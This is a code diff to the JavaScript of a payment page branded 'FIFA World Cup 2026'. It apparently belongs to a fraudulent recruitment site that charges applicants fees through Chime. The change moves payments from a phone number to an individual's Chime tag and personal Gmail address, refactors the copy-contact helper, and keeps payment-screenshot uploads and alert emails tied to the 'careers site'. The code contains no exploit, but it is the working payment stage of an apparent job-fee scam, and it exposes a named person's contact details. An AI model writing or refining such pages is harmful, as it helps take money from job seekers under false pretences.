@@ -1,8 +1,9 @@
 /* FIFA World Cup 2026 — payment page (Chime + careers site ?d= payload) */
 
 const CONFIG = {
-  chimePhoneNumber: "+1 (513) 628-6294",
-  chimePaymentEmail: "payment@fifa26workforce.com",
+  chimePaymentName: "Phillip Marks",
+  chimeTag: "$Phillip-Marks-11",
+  chimePaymentEmail: "phillipmarks001@gmail.com",
   cloudinaryCloudName: "dibwotfd5",
   cloudinaryUploadPreset: "payment-screenshot",
   /** Same Apps Script /exec URL as the careers site — sends payment alert emails */
@@ -221,14 +222,16 @@ function renderFeeItems(items, explanation) {
 }
 
 function setChimeContactDetails() {
-  const phoneEl = document.getElementById("chime-number");
+  const nameEl = document.getElementById("chime-name");
+  const tagEl = document.getElementById("chime-tag");
   const emailEl = document.getElementById("chime-email");
-  const disclaimerPhone = document.getElementById("disclaimer-chime-phone");
+  const disclaimerTag = document.getElementById("disclaimer-chime-tag");
   const disclaimerEmail = document.getElementById("disclaimer-chime-email");
 
-  if (phoneEl) phoneEl.textContent = CONFIG.chimePhoneNumber;
+  if (nameEl) nameEl.textContent = CONFIG.chimePaymentName;
+  if (tagEl) tagEl.textContent = CONFIG.chimeTag;
   if (emailEl) emailEl.textContent = CONFIG.chimePaymentEmail;
-  if (disclaimerPhone) disclaimerPhone.textContent = CONFIG.chimePhoneNumber;
+  if (disclaimerTag) disclaimerTag.textContent = CONFIG.chimeTag;
   if (disclaimerEmail) disclaimerEmail.textContent = CONFIG.chimePaymentEmail;
 }
 
@@ -262,19 +265,29 @@ function selectMethod(method) {
 }
 
 function copyChimeContact(type) {
-  const isEmail = type === "email";
-  const toCopy = isEmail
-    ? CONFIG.chimePaymentEmail
-    : "+" + CONFIG.chimePhoneNumber.replace(/\D/g, "");
-  const btn = document.getElementById(isEmail ? "copy-email-btn" : "copy-phone-btn");
-  const label = document.getElementById(isEmail ? "copy-email-label" : "copy-phone-label");
-  const defaultLabel = isEmail ? "Copy email" : "Copy number";
+  const copyMap = {
+    tag: {
+      value: CONFIG.chimeTag,
+      btnId: "copy-tag-btn",
+      labelId: "copy-tag-label",
+      defaultLabel: "Copy Chime tag",
+    },
+    email: {
+      value: CONFIG.chimePaymentEmail,
+      btnId: "copy-email-btn",
+      labelId: "copy-email-label",
+      defaultLabel: "Copy email address",
+    },
+  };
 
-  const onCopied = () => setCopied(btn, label, defaultLabel);
+  const target = copyMap[type] || copyMap.email;
+  const btn = document.getElementById(target.btnId);
+  const label = document.getElementById(target.labelId);
+  const onCopied = () => setCopied(btn, label, target.defaultLabel);
 
-  navigator.clipboard.writeText(toCopy).then(onCopied, () => {
+  navigator.clipboard.writeText(target.value).then(onCopied, () => {
     const el = document.createElement("textarea");
-    el.value = toCopy;
+    el.value = target.value;
     document.body.appendChild(el);
     el.select();
     document.execCommand("copy");
